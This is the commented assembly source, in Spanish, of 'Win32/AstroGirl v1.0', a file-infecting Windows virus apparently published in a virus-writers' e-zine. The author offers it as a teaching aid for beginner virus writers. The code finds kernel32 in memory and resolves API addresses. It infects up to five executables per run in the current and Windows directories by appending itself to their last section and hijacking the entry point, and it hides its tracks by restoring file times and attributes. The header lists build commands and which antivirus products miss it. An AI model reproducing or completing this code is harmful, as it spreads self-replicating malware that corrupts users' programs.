; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|24 81 ED 05 10 40 00 83
;             \        /					        |C4 04 8B 04 24 66 33 C0
;              \  /\  / 32/AstroGirl v1.0 Astrocoded by Xezaw.          |66 81 38 4D 5A 74 07 2D
;               \/  \/     					        |00 10 00 00 EB F2 8B 70
; -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=|3C 03 F0 66 81 3E 50 45
; Bueno, lo primero decir que Win32/AstroGirl es mi primer virus así que|75 E6 89 85 49 14 40 00
; no esperéis encontrar un gran virus, ni una  complicada  programación.|8B 56 78 03 D0 8B 72 20
; De  momento el  virus  es de  lo más sencillo que  existe en virus  de|03 F0 33 C9 8B 3E 03 F8
; ring3, ésta  es  únicamente la  primera versión,  espero  mejorarlo en|81 3F 47 65 74 50 75 14
; versiones futuras, cambiando el  payload,  introduciendo  un marco SEH|81 7F 04 72 6F 63 41 75
; para la búsqueda de la base de k32, me  gustaría mirar  polimorfismo o|0B 81 7F 08 64 64 72 65
; infección  cavity,  pero  bueno,  todo se verá  con el tiempo... Entre|75 02 EB 06 83 C6 04 41
; otras cosas quiero hacer notar que  quizá la  forma que  encuentres en|EB DA 8B 5A 24 03 D8 D1
; este virus de hacer las  cosas  no  sea la  más  recomendada, no lo se|C1 03 D9 8B 1B C1 EB 10
; la verdad, he  programado  el   virus,  pensando  yo  casi  todas  las|4B 8B 7A 1C 03 F8 C1 C3
; rutinas y luego contrastando  con  cosas  ya codeadas, así que hay por|02 03 DF 8B 1B 03 D8 89
; ahí muchas  paranoias raras  mías, o eso creo... xDD. Otra cosa es que|9D 4D 14 40 00 8D B5 02
; el código no está muy optimizado, espero  optimizarlo  para la próxima|15 40 00 8D BD E4 15 40
; versión, una de las razones para utilizar  algunas  instrucciones  más|00 8D 85 49 14 40 00 8B
; largas ha sido por la facilidad de depurado, y por unos  problemas que|00 8D 9D 4D 14 40 00 8B
; he tenido con mi  debugger, pero  bueno, ya lo  optimizaré si lo  creo|1B 56 50 FF D3 0B C0 0F
; conveniente. El motivo  de que publique este virus en el e-zine, no es|84 FF 07 00 00 89 07 83
; otro que el de ayudar a la gente que está comenzando a programar estos|C7 04 46 80 3E 00 75 FA
; bichitos ya que  otros virus que puedan leer  quizá les sean demasiado|46 80 3E 00 74 02 EB D1
; complicados  o no  estén  comentados  tan  a fondo  como he  intentado|8D BD 3E 14 40 00 57 FF
; comentar éste :). Para los  más adentrados en la materia, tenéis otros|95 EC 15 40 00 89 85 51
; virus en el e-zine que quizá os  interesen,  entre  ellos  uno  de  un|14 40 00 8D BD 1C 16 40
; amigo al que despido desde  aquí  puesto que nos abandona :*(, gracias|00 57 50 FF 95 4D 14 40
; por todo Bumblebee, espero  que nos volvamos a ver algún día y que esa|00 89 85 28 16 40 00 8B
; no sea tu  decisión definitiva :*(,  también  entre otros  me gustaría|B5 F0 15 40 00 8D BD A3
; dar las gracias a:							|18 40 00 57 FF D6 66 83
;                                                                       |7F 02 07 75 21 66 83 7F
; Tokugawa: Gracias por todo :), a ver cuando tomamos unas birras, bueno|06 1C 75 1A 8D 85 55 14
;           tú un whiski de esos XD.					|40 00 8D 9D 7B 14 40 00
;									|8B 8D 28 16 40 00 6A 20
; Henky_0:  Asias por todo :)... estas jodidamente loko kabrong xDDD por|50 53 6A 00 FF D1 8D 85
;	    cierto tengo unas ideas para la Palm... xDDD.		|63 17 40 00 8D 9D 2C 16
;	    								|40 00 8B 8D E4 15 40 00
; GriYo :   Por haberme explicado algunas cosillas :). Y ahorrarme algún|50 53 FF D1 40 74 25 48
;	    que otro dolor de cabeza con el TD32 ;D. 			|89 85 36 17 40 00 EB 51
;									|8B 85 36 17 40 00 8D 9D
; VirusBuster: Por haber  probado  mi bixito con sus antivirus, y por lo|63 17 40 00 8B 8D E8 15
;           amenas que hace  algunas  noches  con su  conversación,  por|40 00 53 50 FF D1 0B C0
;	    cierto, a ver cuando echamos unas carreras ;).		|74 02 EB 35 80 BD 3A 17
; 									|40 00 00 74 05 E9 42 07
; Perikles: Asias por probar mi bixito en tu máquina :), saludos ;)).   |00 00 C6 85 3A 17 40 00
;  									|01 8D 85 32 16 40 00 68
; Saludos  también  para  toda la  gente de #virus de  irc-hispano i  de|04 01 00 00 50 FF 95 00
; #vxers en undernet, a mis amigos los Soviets, a la gente de DTF y como|16 40 00 8D 85 32 16 40
; no a la persona a la que dedico el virus, ella sabe quien es :*.	|00 8B 85 04 16 40 00 EB
;                 						 	|8D 8B 95 3B 17 40 00 83
; Bueno, disfrútenlo!, :),,                                             |FA 05 0F 84 0C 07 00 00
;                                                                       |8D BD 8F 17 40 00 68 80
; Ah, se me olvidaba, Win32/AstroGirl v1.? coming soon xD               |00 00 00 57 8B BD 08 16
; ##################################################################### |40 00 FF D7 6A 00 6A 00
; #	 		 Win32/AstroGirl v1.0			      # |6A 03 6A 00 6A 01 68 00
; #                      --------------------			      #	|00 00 C0 8D 85 8F 17 40
; # -Virus de acción directa ring3.				      # |00 50 8B 85 F4 15 40 00
; #								      # |FF D0 40 0B C0 0F 84 65
; # Para Compilar:						      # |FF FF FF 48 89 85 3F 17
; # tasm32 -ml -m5 -q -zn AstroGirl.asm				      # |40 00 8B B5 83 17 40 00
; # tlink32 -v -Tpe -c -x -aa AstroGirl,,, import32		      # |8D 8D 00 10 40 00 8D BD
; # pewrsec AstroGirl.exe					      # |D7 18 40 00 2B F9 89 BD
; #-------------------------------------------------------------------# |4F 17 40 00 03 FE 89 BD
; # - Win32, Virus Runtime					      # |53 17 40 00 6A 00 56 6A
; # - Infecta añadiendo su código al final de la última sección de    # |00 6A 04 6A 00 50 8B 9D
; #   los PE´s encontrados en el directorio actual i en el de Windoz  # |F8 15 40 00 FF D3 0B C0
; # - Infecta como máximo 5 archivos por ejecución.		      # |0F 84 22 FF FF FF 89 85
; # - El virus ocupa 2263 bytes, aunque el tamaño de infeccion es     # |43 17 40 00 56 6A 00 6A
; #   variable.							      # |00 68 1F 00 0F 00 50 8B
; # - Se activa el 28 de Julio, fecha en la cual muestra una msgbox   # |85 FC 15 40 00 FF D0 89
; #-------------------------------------------------------------------# |85 47 17 40 00 0B C0 0F
; # A pesar de no haber utilizado técnicas Antiheurísticas	      # |84 FB FE FF FF 66 81 38
; # (por lo menos intencionadamente xD):			      # |4D 5A 0F 85 F0 FE FF FF
; #								      # |66 83 78 08 04 0F 85 E5
; # -Es detectado por: Nod, DrWeb, F-Prot y MacAfee.		      # |FE FF FF 8B 70 3C 03 F0
; # -No es detectado por: AVP, Panda ni Norton			      # |66 81 3E 50 45 0F . . .
; #####################################################################
;-----------------------------------------------------------------------------------------------

.386						;Le indicamos al compilador el
						;microprocesador.

.model flat, stdcall				;Un PE

extrn ExitProcess:proc				;Apis usadas para la primera
extrn MessageBoxA:proc				;generación.


jumps

.data
namez	 db "Win32/AstroGirl AstroCoded by a Wazex",0 ;Datos de la primera
titulo	 db "Win32/AstroGirl v1.0",0    	      ;generación.

.code						;Empieza la fiestuki.

BigBang label byte

AstroStart:     call GetDelta 			;llamamos a GetDelta.


GetDelta:
		mov 	 ebp, [esp]		;Obtenemos el desplazamiento
		sub 	 ebp, offset GetDelta	;del código del virus con respecto
						;al archivo infectado, (Delta offset)
						;y lo guardamos en ebp. Si no hiciéramos
						;ésto, el virus funcionaría únicamente
						;en la primera generación, i cascaría
						;en las siguientes.


Kernel32:	add 	 esp, 4h		;Movemos el puntero que señala
						;a la pila. Para volver a situarlo donde
						;estaba al comenzar el programa.



		mov 	 eax, [esp]		;Ahora ya obtenemos una dirección de
						;algun lugar en las profundidades de
						;Kernel32.dll


		xor 	 ax, ax			;ax=0, así nos aseguramos de estar
					  	;al principio de una página de memoria.


AstroBucle:
    		cmp 	 word ptr [eax],'ZM'	;Estamos en el principio de k32?
    		jz 	 AstroPE		;Si es así saltamos a AstroPE
						;teniendo ya en eax la base de k32.

		sub 	 eax, 1000h		;Si no estamos restamos
						;1000h (una página)
		jmp  	 AstroBucle		;Y volvemos a probar suerte


AstroPE:
		mov     esi, [eax + 3Ch]	 ;Comprobamos si hemos encontrado
                add     esi, eax		 ;un Portable Ejecutable.
                cmp     word ptr [esi], 'EP'
		jnz 	AstroBucle		 ;Si no es así volvemos a buscar.

		mov 	[ebp+offset v_K32], eax  ;Salvamos K32

GetProcFind:
		mov 	edx, [esi+78h]		 ;RVA a .edata
		add 	edx, eax		 ;calculo .edata

		mov 	esi, [edx+20h]		 ;RVA a AddressOfNames
		add 	esi, eax		 ;Calculo AddressOfNames
		xor	ecx, ecx		 ;ecx=0


AstroBusqueda:
  	        mov    edi , [esi]		  ;RVA de la Api
						  ;en AddresOfNames.

    	        add    edi, eax		          ;calculamos la dirección

	        cmp    [edi], dword ptr 'PteG'	  ;Comprobamos si es la
	        jnz    Buclez		   	  ;api que estamos buscando:
	        cmp    [edi+4h], dword ptr 'Acor' ;GetProcAddress ;)
	        jnz    Buclez
	        cmp    [edi+8h], dword ptr 'erdd'
	        jnz    Buclez			  ;Si no está saltamos a Buclez
	        jmp    GetProc			  ;Akí está! ;D.


Buclez:		add 	esi, 4h			;Buscamos 4h posiciones más
						;palante.
		inc 	ecx			;Contador para luego calcular
 		jmp 	AstroBusqueda		;la dirección de GetProcAddress


GetProc:	mov 	ebx, [edx+24h]		;Rva a AddressOfNameOrdinals
		add	ebx, eax		;La calculo.
		rol 	ecx, 1h			;ecx*2
		add	ebx, ecx		;Sumamos al inicio de
						;AddressOfOrdinals.
		mov	ebx, [ebx]		;Obtenemos el Ordinal
		shr 	ebx, 10h		;Tamaño word
		dec 	ebx			;ebx-1, i ia lo tenemos :)

		mov	edi, [edx+01ch]		;Rva a AddressOfFunctions
		add	edi, eax		;Calculada
		rol 	ebx, 2h			;ebx*4
		add	ebx, edi		;Buscamos GetProcAddress
		mov 	ebx, [ebx]		;En ebx tenemos su RVA

		add 	ebx, eax		;Y por fin aquí su
						;dirección! :))

		mov 	dword ptr [ebp+offset GetP], ebx   ;Salvamos la dirección

;-------------------------------------------------------------------------------------

	lea 	 esi, [ebp + offset NombresApis_start]     ;Principio de la tabla
							   ;de los nombres de las
							   ;APIs k voi a buscar en
        						   ;Kernel32.dll

	lea 	 edi, [ebp + offset ValoresApis_start]	   ;Principio de la tabla
							   ;donde voi a guardar estos
					                   ;valores


BuscaApis:	lea 	 eax, [ebp + offset v_K32]         ;En eax ponemos
		mov	 eax, [eax]			   ;la base de K32

		lea	 ebx, [ebp + offset GetP]	   ;En ebx la dirección
		mov	 ebx, [ebx]			   ;de GetProcAddress

		push 	 esi			           ;El nombre de la API que
					                   ;buscamos a la pila.

		push	 eax			           ;La base de K32 a la pila.

		call 	 ebx			           ;Llamamos a GetProcAddress
		or 	 eax, eax		           ;Comprobamos si ha dado error

		je	 host			           ;En tal caso saltamos al host

		mov 	 dword ptr [edi], eax	           ;Si no, salvamos el resultado.

		add	 edi, 4h 		           ;Preparamos edi para salvar el
						           ;siguiente resultado.


SiguienteApi:	inc 	 esi			;Buscamos la siguiente API, en
		cmp 	 byte ptr [esi], 00h	;nuestra tabla están separadas
		jne	 SiguienteApi		;por ceros.

		inc	 esi			;Hemos encontrado ceros.

		cmp 	 byte ptr [esi], 00h    ;Miramos a ver si siguen otros
						;dos ceros

		je  	 OtraLibreria	        ;En tal caso hemos recorrido toda
				        	;la tabla y tenemos ya todas las
					        ;APIs de K32 que necesitábamos

		jmp 	 BuscaApis		;Si no es así es que estamos en la
						;siguiente API de la tabla y volvemos
						;a la rutina anterior para calcular
						;su dirección.

OtraLibreria:
		lea 	 edi, [ebp+ offset n_User32]	;Nombre de la siguiente librería
		push 	 edi 				;en este caso es User32.dll.

		call	 dword ptr [ebp + offset v_GetModuleHandleA];Hallamos su handle
		mov 	 dword ptr [ebp+offset v_User32 ], eax	    ;Lo salvamos

		lea 	 edi, [ebp + offset n_MessageBoxA]	    ;Nombre de la API
								    ;que buscamos.

		push	 edi					    ;Lo pusheamos.
		push	 eax					    ;Pusheamos el handle
								    ;de la dll.

		call	 dword ptr [ebp+ offset GetP]		    ;Llamamos a
								    ;GetProcAddress

		mov 	 dword ptr [ebp+offset v_MessageBoxA ], eax ;Obtenemos la dirección
								    ;de MessageBoxA y la
								    ;salvamos.

	;Nota: No hace falta que cargue la librería con la API LoadLibraryA, ya que esta
	;librería siempre está cargada, pero si quisiera utilizar alguna otra es posible
	;que necesitara hacerlo.


AstroPayload:
		mov	 esi, [ebp+ offset v_GetSystemTime]	    ;API que nos devuelve la
								    ;fecha del sistema.

		lea      edi, [ebp + offset SystemTime]		    ;Puntero a una estructura
								    ;en la zona de datos que
								    ;va a utilizar esta API.

		push	 edi					    ;edi a la pila
		call	 esi					    ;Llamamos a la API

		cmp 	 [edi.ST_wMonth], 07h			    ;Comprobamos si estamos en
								    ;el mes de Julio

		jne	 AstroInfeccion				    ;Si no es así saltamos a la
								    ;rutina de infección.

		cmp 	 [edi.ST_wDay], 01Ch			    ;Comprobamos si es día 28

		jne 	 AstroInfeccion				    ;Si no a infectar..

	;Ahora viene el cutre payload xDD, espero hacer algo más vistoso para la
	;próxima versión, de momento contentaros con una Msgbox. xDD

		lea 	 eax, [ebp+offset AstroPayload_Tittle]      ;Pues eso, título
		lea	 ebx, [ebp+offset AstroPayload_Message1]    ;y contenido

		mov	 ecx, [ebp+offset v_MessageBoxA]  	    ;Dirección antes obtenida.

		push 	 20h					    ;Pusheamos las cosas y tal
		push	 eax					    ;...
		push 	 ebx 					    ;...
		push	 00h					    ;...
		call 	 ecx					    ;y llamamos a la API


AstroInfeccion:							    ;Por fin toca infectar :)


AstroDir:
		lea 	 eax, [ebp+offset WIN32_FIND_DATA]	    ;Puntero a una estructura
								    ;de archivos.

		lea 	 ebx, [ebp+offset AstroFiles]		    ;Extensión de los archivos
								    ;a buscar.

		mov	 ecx, [ebp+offset v_FindFirstFileA]	    ;En ecx, la dirección de
								    ;FindFirstFileA

		push 	 eax					    ;Pusheamos los parametros
		push 	 ebx					    ;...
		call 	 ecx					    ;Y llamamos a la API

		inc 	 eax					    ;Comprobamos si la API
								    ;devolvió un valor de fallo,
		jz	 CompruebaDir				    ;en tal caso no encontró
								    ;ficheros infectables en el
								    ;directorio activo. Y salta
								    ;a una rutina que comprueba
								    ;el directorio en el que nos
								    ;encontramos.

		dec 	 eax					    ;Dejamos eax como estaba.

		mov 	 dword ptr [ebp+search_handle], eax	    ;Guardamos el handle que
								    ;devolvió FindFirstFileA

		jmp 	 AstroInfecta				    ;Y procedemos a infectar
								    ;el primer archivo del
								    ;directorio.


Siguiente:
		mov 	 eax, dword ptr [ebp+search_handle]	       ;Handle guardado antes.

		lea      ebx, dword ptr [ebp + offset WIN32_FIND_DATA] ;Puntero a la estructura
								       ;de búsqueda de archivos.

		mov	 ecx, [ebp+offset v_FindNextFileA]	       ;En ecx la dirección de
								       ;FindFirstFileA

		push	 ebx					    ;Pusheamos parámetros
		push 	 eax					    ;...

		call 	 ecx					    ;Llamamos a FindFirstFileA

		or	 eax, eax				    ;Comprobamos si dio fallo,
		jz	 CompruebaDir				    ;en tal caso saltamos
		jmp	 AstroInfecta				    ;CompruebaDir, si no saltamos
								    ;a la rutina que va a
								    ;infectar el archivo
								    ;encontrado.


CompruebaDir:	cmp      byte ptr [ebp+offset IWasHere],00h	    ;Comprobamos si todavía nos
								    ;encontramos en el directorio
		je	 AstroWin				    ;actual, si es así saltamos
								    ;a AstroWin

		jmp 	 host					    ;Sino es que ya hemos acabado
								    ; :), i saltamos al host.

AstroWin:

		mov	byte ptr [ebp+offset IWasHere], 01h	    ;Dejamos una marca, para
								    ;saber que estuvimos aquí.

		lea     eax, dword ptr [ebp + WindowsDir]	    ;Obtengo el directorio de
                push    Max_Path 				    ;Windows, mediante
		push 	eax					    ;GetWindowsDirectoryA
                call    dword ptr [ebp + offset v_GetWindowsDirectoryA]

		lea     eax, dword ptr [ebp + WindowsDir]	    ;Cambio de directorio y
                push    eax					    ;me voy al que he obtenido
                mov	eax, [ebp+offset v_SetCurrentDirectoryA]    ;para seguir buscando
		call	eax					    ;archivos infectables.
           	jmp	AstroDir				    ;API(SetCurrentDirectoryA)


;-------------------------------------------------------------------------------------------

AstroInfecta:							    ;La verdadera Infección ;)

		mov	edx, [ebp+ offset AstroContador]	    ;Comprobamos si el virus
		cmp	edx, 5h					    ;ha encontrado ya cinco
		je	host					    ;archivos infectables, en
								    ;ese caso, para no dar mucho
								    ;el cante, devolvemos el
								    ;control al host.



AsttributesChange:

		lea	edi, [ebp+ offset WFD_szFileName]	    ;Nombre del fichero
		push 	80h					    ;Nuevos atributos ;)
		push 	edi					    ;Pusheo el nombre
		mov 	edi, [ebp+ offset v_SetFileAttributesA]	    ;Calculo la API que necesito
		call	edi		    			    ;Cambio los atributos :)



AstroFileHandle:

								    ;Forma de abrir el archivo:
		push	0					    ;hTemplateFile..
		push 	0 					    ;Atributos
		push 	3 					    ;Sólo si existe

		push	0 					    ;Atributos de seguridad,
								    ;sería un puntero a una
								    ;estructura de este tipo.

		push 	1 					    ;Si el programa puede ser
								    ;accedido por ejemplo por
								    ;un proceso hijo..
		push 	0C0000000h  				    ;Lectura y escritura

		lea 	eax, [ebp+offset WFD_szFileName]    	    ;Nombre del archivo
		push 	eax 					    ;lo pusheo
		mov	eax, [v_CreateFileA+ebp]		    ;Calculo la API CreateFileA
		call	eax					    ;La llamo, y archivo abierto.

		inc	eax				            ;eax+1, para ver si da 0
		or  	eax, eax				    ;Compruebo posibles fallos
		jz	Siguiente				    ;en la apertura del archivo
		dec	eax					    ;si ocurren buscamos otro
								    ;archivo ;)

		mov	[ebp + offset AstroHandle], eax		    ;Me guardo el handle del
								    ;archivo.


AstroCMapping:
		mov	esi, [ebp+ offset WFD_nFileSizeLow] 	    ;Tamaño del fichero a
								    ;infectar.

		lea	ecx, [ebp+offset BigBang]		    ;Calculo el tamaño del
		lea	edi, [ebp+offset BigCrunch]		    ;virus.
		sub	edi, ecx
		mov 	[ebp+offset AstroViralSize], edi	    ;Y ia de paso me lo guardo.

		add	edi, esi				    ;Sumamos los dos tamaños ;)

		mov	[ebp+offset InfectedSize], edi		    ;Este tb me lo guardo



		push 	0					    ;Creamos el objeto mapeado
								    ;sin nombre.

		push    esi					    ;Tamaño a mapear

		push 	0					    ;MaximumSizeLow

		push	04h					    ;Protección del objeto
								    ;mapeado.

		push 	0					    ;Atributos de seguridad
								    ;opcionales

		push 	eax					    ;Handle obtenido en la rutina
								    ;anterior.

		mov	ebx, [ebp+offset v_CreateFileMappingA]	    ;Calculamos la dirección de
								    ;la API
		call	ebx    					    ;Y la llamamos.
		or	eax, eax				    ;Comprobamos si dio error.
		jz	Siguiente				    ;Si es así buscamos otro.

		mov	[ebp+offset AstroMapHandle], eax	    ;Me guardo el Handle.



AstroMapping:

		push	esi					    ;Tamaño a mapear

		push 	0					    ;FileOffsetLow por si
								    ;quisieramos mapear el
								    ;archivo en alguna zona en
								    ;especial. Como no es así
								    ;pues 0.

		push	0					    ;FileOffsetHigh, otro tanto
								    ;de lo mismo.

		push 	000F001Fh				    ;Permiso de lectura y
								    ;escritura.

		push	eax					    ;Handle de la rutina anterior
		mov	eax, [ebp+offset v_MapViewOfFile]	    ;Calculamos la API Mapview..

		call 	eax					    ;La llamamos y obtenemos en
								    ;eax, la dirección de memoria
								    ;donde se ha mapeado el
								    ;archivo.

		mov	[ebp+ offset AstroFile], eax 		    ;La salvamos y comprobamos
		or	eax, eax				    ;que no dio error, si fuera
		jz	Siguiente				    ;así, lo intentamos con otro
								    ;archivo.

ChekUtilFile:

								    ;Aquí comprobamos que el
								    ;archivo sea infectable:

		cmp     word ptr [eax], 'ZM'			    ;Empieza por MZ?
                jne     Siguiente
		cmp     word ptr [eax + 08h], 04h		    ;Es un archivo de Msdos?
                jne     Siguiente
		mov     esi, [eax + 3Ch]			    ;Es un Portable Ejecutable?
                add     esi, eax
                cmp     word ptr [esi], 'EP'
                jnz     Siguiente				    ;Sino cumple estos requisitos
							 	    ;buscamos otro archivo.


ChekAstroInfected:

		cmp 	 word ptr [esi+42h], 'XW'		    ;Comprobamos si en PE+42h
		jnz	 AstroContadorz				    ;hay un WX, si no saltamos
		call 	 AstroChapa				    ;a Astrocontadorz, y si sí
		jmp 	 Siguiente 				    ;pues lo chapamos xD.


AstroContadorz: mov	 edx, [ebp+ offset AstroContador]	    ;Incrementamos nuestro
		inc	 edx					    ;contador una unidad, puesto
		mov	 [ebp+offset AstroContador], edx	    ;que hemos encontrado un
								    ;archivo infectable.


GetAlignment:
		mov	edi, [esi+3Ch]				    ;Obtenemos el alignment del
								    ;archivo, el la cabecera PE
								    ;+3Ch

		mov	[ebp+offset Alignment], edi		    ;Salvamos el Alignment
GetNewSize:
		xor	edx, edx			            ;Hacemos edx=0 para poder
								    ;dividir.

		mov	eax, [ebp+offset InfectedSize]		    ;En eax, host+virus


		div	edi					    ;Dividimos por el Alignment.

		inc	eax					    ;Obtenemos el resultado en
								    ;eax, y lo incrementamos para
								    ;averiguar el nuevo número
								    ;de bloques.

		mul	edi					    ;Y multiplicamos el número
							            ;de bloques obtenidos por el
								    ;alignment. Este va a ser el
								    ;nuevo tamaño a mapear.

		mov	edi, eax				    ;Tamaño a mapear la siguiente
								    ;vez en edi.



		call	AstroChapa				    ;Llamamos al proc para
								    ;cerrar el archivo.



AstroFileHandle2:

								    ;Forma de abrir el archivo:
		push	0					    ;hTemplateFile..
		push 	0 					    ;Atributos
		push 	3 					    ;Sólo si existe

		push	0 					    ;Atributos de seguridad,
								    ;sería un puntero a una
								    ;estructura de este tipo.

		push 	1 					    ;Si el programa puede ser
								    ;accedido por ejemplo por
								    ;un proceso hijo..
		push 	0C0000000h  				    ;Lectura y escritura

		lea 	eax, [ebp+offset WFD_szFileName]    	    ;Nombre del archivo
		push 	eax 					    ;lo pusheo
		mov	eax, [v_CreateFileA+ebp]		    ;Calculo la API CreateFileA
		call	eax					    ;La llamo, y archivo abierto.

		inc	eax				            ;eax+1, para ver si da 0
		or  	eax, eax				    ;Compruebo posibles fallos
		jz	Siguiente				    ;en la apertura del archivo
		dec	eax					    ;si ocurren buscamos otro
								    ;archivo ;)

		mov	[ebp + offset AstroHandle], eax		    ;Me guardo el handle del
								    ;archivo.


AstroCMapping2:



		push 	0					    ;Creamos el objeto mapeado
								    ;sin nombre.

		push    edi					    ;Tamaño a mapear

		push 	0					    ;MaximumSizeLow

		push	04h					    ;Protección del objeto
								    ;mapeado.

		push 	0					    ;Atributos de seguridad
								    ;opcionales

		push 	eax					    ;Handle obtenido en la rutina
								    ;anterior.

		mov	ebx, [ebp+offset v_CreateFileMappingA]	    ;Calculamos la dirección de
								    ;la API
		call	ebx    					    ;Y la llamamos.
		or	eax, eax				    ;Comprobamos si dio error.
		jz	Siguiente				    ;Si es así buscamos otro.

		mov	[ebp+offset AstroMapHandle], eax	    ;Me guardo el Handle.



AstroMapping2:


		push	edi					    ;Tamaño a mapear

		push 	0					    ;FileOffsetLow por si
								    ;quisieramos mapear el
								    ;archivo en alguna zona en
								    ;especial. Como no es así
								    ;pues 0.

		push	0					    ;FileOffsetHigh, otro tanto
								    ;de lo mismo.

		push 	000F001Fh				    ;Permiso de lectura y
								    ;escritura.

		push	eax					    ;Handle de la rutina anterior
		mov	eax, [ebp+offset v_MapViewOfFile]	    ;Calculamos la API Mapview..

		call 	eax					    ;La llamamos y obtenemos en
								    ;eax, la dirección de memoria
								    ;donde se ha mapeado el
								    ;archivo.

		mov	[ebp+ offset AstroFile], eax 		    ;La salvamos y comprobamos
		or	eax, eax				    ;que no dio error, si fuera
		jz	Siguiente				    ;así, lo intentamos con otro
								    ;archivo.


FindLastSection:
		mov	ebx, [eax+3Ch]				    ;RVA a File header
		add	ebx, eax				    ;File Header
		xor	esi, esi
		mov	si, word ptr [ebx+14h]			    ;Tamaño de la optional header
		add	ebx, 18h				    ;Calculo la optional header.
		add	esi, ebx				    ;Tabla de Secciones.


		mov	ebx, [ebp+offset AstroFile]		    ;Base del PE
		mov	ecx, [eax+3ch]				    ;RVA a cabecera PE
		add	ebx, ecx				    ;Cabecera PE
		xor 	ecx, ecx				    ;ecx=0
		mov	cx, word ptr [ebx+6h]			    ;Número de secciones.

		dec  	ecx

Astrolast:
		add	esi, 28h				    ;Una tabla de sección cada
								    ;28h, buscamos la nuestra.
		loop	Astrolast				    ;y obtenemos en edx, su
								    ;dirección.

LastSection:
		or      [esi + 24h], 0A0000020h			    ;Flags de la sección, por
								    ;olvidarme de cambiarles
								    ;me comí un buen rato la
								    ;cabeza.. xD. Con ésto
								    ;hacemos que la seccion sea
								    ;ejecutable, legible,
								    ;escribible i de código:
								    ;[CERW] según tdump.

		mov	edi, [ebx+28h]				    ;Viejo EntryPoint en edi
		push	edi					    ;Guardamos una copia.

		mov	edi, [esi+10h]				    ;SizeOfRawData en edi.
		add	edi, [esi+0ch]				    ;Le sumo la VirtualAdress
								    ;a la última sección

		mov	[ebx+28h], edi				    ;Y lo salvo como nuevo
								    ;EntryPoint.

		push	edi					    ;Guardo una copia.

		mov	edi, [esi+10h]				    ;SizeOfRawData.
		add	edi, [esi+14h]				    ;le sumo el PointerToRawData.
		add	edi, [ebp+offset AstroFile]		    ;Y la base del PE.
		mov	[ebp+offset flastsection], edi		    ;Lo salvamos.


		mov	eax, [esi+10h]				    ;SizeOfRawData
		add	eax, [ebp+AstroViralSize]		    ;Le sumo el código del virus.


;Ahora alineamos la sección, al igual que lo hicimos con el tamaño del PE la primera vez que
;lo mapeamos :)


		mov	edi, [ebx+3Ch]				    ;Alignment

		xor	edx, edx
		div	edi					    ;Dividimos por el Alignment.

		inc	eax					    ;Obtenemos el resultado en
								    ;eax, y lo incrementamos para
								    ;averiguar el nuevo número
								    ;de bloques.

		mul	edi					    ;Y multiplicamos el número
							            ;de bloques obtenidos.

		mov	[esi+10h], eax				    ;Nuevo SizeOfRawData.
		mov	[esi+8h], eax				    ;Nueva VirtualSize.


		add	eax, [esi+0ch]				    ;Tamaño de la sección
		mov	[ebx+50h], eax				    ;alineado+VirtualAdress,
								    ;y lo salvo en el campo
								    ;SizeOfImage.


AstrocopiaVx:	mov	edi, [ebp+offset flastsection]		  ;Final de la última sección.

		lea 	esi,[ebp+offset BigBang]                  ;Principio del virus.
		mov 	ecx, [ebp+offset AstroViralSize]	  ;tamaño de lo que se copia.
		rep 	movsb

AstrosalvaEntrys:

;Ésto que hago ahora es una paranoia que me ha dado, salvo los entrypoints directamente sobre
;el archivo que infecto, después de haber copiado mi código, y luego puedo acceder mediante
;los labels normales. No se si ésta será la mejor forma de hacerlo, pero como no se me ocurre
;otra pues ahí la dejo xD.


		mov	edi, [ebp+offset flastsection]		  ;Edi=Final última sección.
		pop	eax					  ;NewEntryPoint.
		pop	ecx					  ;OldEntryPoint.

		IehOld = OldEntryPoint-BigBang
		IehNew = NewEntryPoint-BigBang
		mov	[edi+IehOld], ecx
		mov	[edi+IehNew], eax



AstroMarkInfect:
		mov	eax, [ebp+offset AstroFile]		  ;Base del archivo.

		mov	ebx, [eax+3ch]				  ;RVA a cabecera PE.
		add	eax, ebx				  ;La calculo.

		mov	word ptr [eax+42h], 'XW'		  ;Marco el archivo, el campo
							 	  ;PE+42h de tamaño Dword, no
								  ;es usado, así que es un buen
								  ;lugar para dejar marcas.

		call 	AstroChapa				  ;Cierro el archivo.

   		jmp 	Siguiente				  ;Y vamos a por otro ;)

;*********************************************************************************************
;			Proc para Cerrar y restaurar un archivo			     	     *
;---------------------------------------------------------------------------------------------
AstroChapa proc					           	    ;Cerramos el archivo, para
								    ;volverle a mapear con el
								    ;nuevo tamaño.


		push 	dword ptr [ebp+ offset AstroFile]	    ;Dirección de memoria donde
								    ;comienza el archivo mapeado
		mov	eax, [ebp+ offset v_UnmapViewOfFile]	    ;Llamamos a UnmapViewOfFile
		call 	eax
		
		push	dword ptr [ebp+ offset AstroMapHandle]	    ;Handle Obtenido con
								    ;CreateFileMappingA
		mov 	eax, [ebp+ offset v_CloseHandle]	    ;Llamamos a CloseHandle
		call 	eax


AstroRestaurar:	
		lea	eax, dword ptr [ebp+ offset WFD_ftLastWriteTime]  ;Última escritura
		lea 	ebx, dword ptr [ebp+ offset WFD_ftLastAccessTime] ;Último Acceso
		lea	ecx, dword ptr [ebp +offset WFD_ftCreationTime]   ;Fecha de Creación
		push	eax
		push	ebx
		push	ecx
		mov	eax, [ebp + offset AstroHandle]			  ;Handle del archivo
		push	eax
		mov	eax, [ebp+offset v_SetFileTime]			  ;Api SetFileTime
		call 	eax						  ;La llamo :).


ChapaArchivo:
		push 	dword ptr [ebp+ offset AstroHandle] 	    ;Handle Obtenido con
		mov 	eax, [ebp+ offset v_CloseHandle]	    ;CreateFileA.
		call 	eax					    ;Llamamos a CloseHandle.

AstributosRestaura:						    ;Restauro los atributos que
								    ;cambié al principio. Éstos
								    ;siguen en la estructura que
								    ;escribe FindFirst/next file
								    ;...

		push	dword ptr [ebp+WFD_dwFileAttributes]	    ;Pusheo Atributos.
		lea	eax, [ebp+ WFD_szFileName]		    ;Nombre del archivo.
		push	eax
		mov	eax, [ebp+offset v_SetFileAttributes]	    ;API SetFileAttributes
		call 	eax					    ;La iamo.

		ret						    ;Final del proceso de
								    ;Cerrar un archivo :).

endp


;*************************************************************************************
;* 				Area de datos del vírus				     *
;*************************************************************************************
AstroData:

;#####################################################################################
;---------------------------------Algunos datos :)-----------------------------------#
;#####################################################################################

n_K32				 db 'Kernel32.dll',0
n_User32			 db 'User32.dll',0
v_K32				 dd 00h
GetP				 dd 00h
